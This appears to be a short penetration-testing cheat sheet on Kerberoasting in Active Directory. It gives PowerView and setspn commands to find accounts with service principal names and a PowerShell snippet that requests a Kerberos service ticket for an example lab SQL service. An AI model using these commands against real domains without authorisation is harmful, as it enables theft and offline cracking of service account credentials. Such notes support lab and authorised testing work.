# Kerberoast

## Find SPN

### Powerview

```text
. .\powerview.ps1
Get-NetUser -SPN
```

### Powershell

```text
setspn -T domain -Q Service/*
```

## Request a TGS

```text
Add-Type -AssemblyName system.identitymodel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/lab.domain.local"
```

